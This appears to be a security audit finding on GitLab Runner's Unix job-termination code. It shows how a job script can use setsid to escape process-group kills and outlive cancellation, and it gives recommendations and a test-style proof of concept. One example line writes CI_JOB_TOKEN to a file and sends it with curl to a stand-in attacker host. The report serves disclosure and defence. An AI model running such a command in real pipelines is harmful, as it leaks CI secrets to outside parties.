Confirmed: there is no cgroup, PID namespace, or `Setsid`/`PR_SET_PDEATHSIG` enforcement anywhere in `helpers/process/`, so `syscall.Kill(pk.getPID(), ...)` (negative PID = process-group signal) is the sole termination mechanism, and a script-spawned process that calls `setsid`/`setpgid` to leave that group is unreachable by it.

### Title
Job script can detach a subprocess from its process group via `setsid`/`setpgid`, letting it survive cancellation and continue processing secrets - ([File: helpers/process/killer_unix.go])

### Summary
`unixKiller.Terminate`/`ForceKill` send `SIGTERM`/`SIGKILL` to `-pk.cmd.Process().Pid`, i.e., only to the process group created for the job's top-level shell process via `Setpgid: true` in `setProcessGroup`. Any subprocess the job script spawns that calls `setsid` (or `setpgid`) creates a new session/process group and is no longer a member of that group, so it is not signaled by `KillAndWait` and keeps running after job cancellation/timeout.

### Finding Description
`setProcessGroup` in [1](#0-0)  sets `Setpgid: true` only on the `exec.Cmd` that GitLab Runner itself starts (the job's top-level shell). `unixKiller.getPID` then negates that single PID to target the whole group: [2](#0-1) , and `Terminate`/`ForceKill` call `syscall.Kill(pk.getPID(), SIGTERM/SIGKILL)` [3](#0-2) . `KillAndWait` (used for job cancellation and both `GracefulTimeout`/`KillTimeout` enforcement) is entirely built on this single `Terminate`→wait→`ForceKill` sequence [4](#0-3) .

Process groups on POSIX systems are per-process, not inherited transitively in an unbreakable way: any child process (including ones started by a shell/custom executor script, which the pipeline author fully controls) can call `setsid(2)` (e.g. via the `setsid` command or a coprocess) to become a session leader and thereby form/join a *new* process group. From that point, `kill(-pgid, sig)` targeting the original group's PID no longer reaches it, because it is not a member of that group anymore. There is no cgroup, PID namespace, or `PR_SET_PDEATHSIG`-based containment anywhere in `helpers/process/` to catch such escapees - the process-group signal is the only mechanism used for shell/custom executor cleanup.

Attacker input is simply the job script content itself (`.gitlab-ci.yml` `script:`), which is fully attacker-controlled for shell and custom executors. A script line such as `setsid sh -c 'sleep 300; echo "$CI_JOB_TOKEN" > /tmp/leak; curl -F file=@/tmp/leak https://attacker.example' &` detaches immediately and is never touched by `Terminate`/`ForceKill`.

### Impact Explanation
After the job is canceled or hits `GracefulTimeout`/`KillTimeout`, the detached subprocess keeps running on the runner host/container, with access to whatever secret job variables (`CI_JOB_TOKEN`, masked custom variables, etc.) were exported into its environment at spawn time. It can write those secrets to a file that a later stage, a subsequent job sharing the same host/workspace (in non-ephemeral shell executor setups), or an external exfiltration channel (e.g., `curl` to an attacker server) picks up - bypassing the trace-masking path entirely since it never goes through the log stream. This is a genuine violation of the invariant that "cancellation must terminate all job-spawned processes so no secret continues to be processed/exfiltrated after job stop."

### Likelihood Explanation
Feasible with just pipeline-author-level control over job script content, no privilege escalation or admin misconfiguration required, and reproducible deterministically on any shell/custom executor (Linux/BSD/etc. covered by the build tag). It only requires the pipeline author to know to call `setsid`/`setpgid`; there's no exotic race condition or timing dependency.

### Recommendation
Do not rely solely on process-group signaling for job process cleanup on shell/custom executors. Options: (1) put the job's top-level process (and its descendants) in a dedicated cgroup (cgroup v1/v2 `freezer`/`kill`) at spawn time and kill via the cgroup on termination, which catches processes regardless of `setsid`; (2) use PID namespaces where available; (3) as a partial mitigation, detect/kill any processes newly appearing under the job's original session/controlling terminal or tagged via an environment marker, walking `/proc` for descendants rather than trusting the process group alone.

### Proof of Concept
Go integration test in `helpers/process` (build-tag `integration`, unix):
1. Start a `Commander` running a shell script equivalent to: `setsid sh -c 'sleep 30 > /tmp/pgid_escape_marker_$$ ' &`, capturing the detached child's PID (e.g., have the script write its own PID to a known file immediately after `setsid`).
2. Call `osKillWait.KillAndWait(command, waitCh)` with `gracefulKillTimeout`/`forceKillTimeout` set small.
3. After `KillAndWait` returns, read the recorded PID and assert with `syscall.Kill(pid, 0)` returning `nil` (process still alive) — proving it survived `Terminate`/`ForceKill`, which only signaled `-originalPid`.
4. Contrast with a non-`setsid` child of the same command, asserting it *is* dead, to isolate the escape to the `setsid` case.

### Citations

**File:** helpers/process/job_unix.go (L36-40)
```go
func setProcessGroup(c *exec.Cmd) {
	c.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
	}
}
```

**File:** helpers/process/killer_unix.go (L21-44)
```go
func (pk *unixKiller) Terminate() {
	if pk.cmd.Process() == nil {
		return
	}

	err := syscall.Kill(pk.getPID(), syscall.SIGTERM)
	if err != nil {
		pk.logger.Warn("Failed to terminate process:", err)

		// try to kill right-after
		pk.ForceKill()
	}
}

func (pk *unixKiller) ForceKill() {
	if pk.cmd.Process() == nil {
		return
	}

	err := syscall.Kill(pk.getPID(), syscall.SIGKILL)
	if err != nil {
		pk.logger.Warn("Failed to force-kill:", err)
	}
}
```

**File:** helpers/process/killer_unix.go (L46-52)
```go
// getPID will return the negative PID (-PID) which is the process group. The
// negative symbol comes from kill(2) https://linux.die.net/man/2/kill `If pid
// is less than -1, then sig is sent to every process in the process group whose
// ID is -pid.`
func (pk *unixKiller) getPID() int {
	return pk.cmd.Process().Pid * -1
}
```

**File:** helpers/process/killer.go (L66-92)
```go
func (kw *osKillWait) KillAndWait(command Commander, waitCh chan error) error {
	process := command.Process()
	if process == nil {
		return ErrProcessNotStarted
	}

	log := kw.logger.WithFields(logrus.Fields{
		"PID": process.Pid,
	})

	processKiller := newProcessKiller(log, command)
	processKiller.Terminate()

	select {
	case err := <-waitCh:
		return err
	case <-time.After(kw.gracefulKillTimeout):
		processKiller.ForceKill()

		select {
		case err := <-waitCh:
			return err
		case <-time.After(kw.forceKillTimeout):
			return &KillProcessError{pid: process.Pid}
		}
	}
}
```
